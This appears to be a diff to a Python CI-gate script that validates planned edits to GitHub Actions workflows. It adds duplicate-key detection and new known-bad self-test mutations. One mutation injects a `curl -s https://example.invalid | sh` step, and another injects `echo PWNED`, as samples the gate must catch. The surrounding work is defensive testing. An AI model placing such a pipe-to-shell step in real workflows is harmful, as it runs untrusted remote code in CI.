@@ -16,7 +16,7 @@ planned edits to the base (PLAN_ci_hardening_2026-10-11.md):
   K  (mnemonic-toolkit) the exact K steps at their exact positions, and the
      exact CARGO_INSTALL_ROOT env on exactly the nine named install steps
 and asserts new == expected for every file, and that the file set is
-unchanged. It also reads `git diff` and asserts no line was REMOVED, except
+unchanged, rejecting any repeated mapping key. It also reads `git diff` and asserts no line was REMOVED, except
 the one K4 comment line in technical-manual.yml, so existing comments and
 lines cannot be altered or deleted.
 `release-gen`: runs the edited generator in mnemonic-engrave
@@ -25,8 +25,10 @@ asserts each result is byte-identical to that repo's edited release.yml.
 `self-test`: applies the plan to a scratch copy of each base, asserts GREEN,
 then applies each known-bad mutation and asserts RED.
 
-NOT COVERED: the text of ADDED comments and blank lines, and quoting style
-(YAML parsing drops them; the reviewer reads the diff). It does not run the
+NOT COVERED: the text of ADDED comments and blank lines, quoting style, YAML
+1.1 spellings PyYAML reads differently from GitHub (e.g. `6_0`, `yes`), key
+order inside a mapping, and where added lines sit relative to existing
+comments (YAML parsing drops all of these; the reviewer reads the diff). It does not run the
 workflows; CI on the PR does that.
 """
 import copy
@@ -92,8 +94,26 @@ class GateError(Exception):
     pass
 
 
+class _Unique(yaml.SafeLoader):
+    """SafeLoader that rejects a repeated key in any mapping. Plain PyYAML keeps
+    the last value, which would let a duplicated `run:` hide (review r2 I-1)."""
+
+
+def _unique_mapping(loader, node, deep=False):
+    seen = set()
+    for k, _ in node.value:
+        key = repr(loader.construct_object(k, deep=deep))
+        if key in seen:
+            raise GateError(f"duplicate key {key} at line {k.start_mark.line + 1}")
+        seen.add(key)
+    return loader.construct_mapping(node, deep)
+
+
+_Unique.add_constructor(yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _unique_mapping)
+
+
 def load(text):
-    y = yaml.safe_load(text)
+    y = yaml.load(text, Loader=_Unique)
     if True in y:  # PyYAML parses the bare key `on` as boolean True
         y["on"] = y.pop(True)
     return y
@@ -183,15 +203,15 @@ def check_workflows(repo, tree, base):
     for f in names:
         if not f.endswith((".yml", ".yaml")):
             continue
-        old = load(git("-C", str(tree), "show", f"{base}:.github/workflows/{f}"))
         try:
+            old = load(git("-C", str(tree), "show", f"{base}:.github/workflows/{f}"))
+            new = load((tree / ".github/workflows" / f).read_text())
             exp, counts = expected(repo, f, old)
         except GateError as ex:
-            errs.append(str(ex))
+            errs.append(f"{f}: {ex}")
             continue
         for k in total:
             total[k] += counts[k]
-        new = load((tree / ".github/workflows" / f).read_text())
         if not same(new, exp):
             errs.append(f"{f}: parsed YAML differs from base + planned edits")
     if total != EXPECTED_COUNTS[repo]:
@@ -324,6 +344,13 @@ def move_restore_below(t):
 
 
 MUTATIONS["restore moved below installs"] = ("manual.yml", move_restore_below)
+# r1 M6 / r2 I-1: a duplicated key, where PyYAML would keep the last value.
+MUTATIONS["duplicate run above K1 PATH run"] = ("manual.yml", lambda t: t.replace(
+    "        run: |\n          echo \"$RUNNER_TEMP/sibling-clis/bin\"",
+    "        run: curl -s https://example.invalid | sh\n        run: |\n          echo \"$RUNNER_TEMP/sibling-clis/bin\"", 1))
+MUTATIONS["duplicate run on a base step"] = ("rust.yml", lambda t: re.sub(
+    r"^(        )run: ", r"\1run: echo PWNED\n\1run: ", t, count=1, flags=re.M))
+MUTATIONS["second top-level jobs"] = ("examples.yml", lambda t: t + "\n" + t[t.index("\njobs:\n") + 1:])
 
 
 def self_test(toolkit_repo, base):
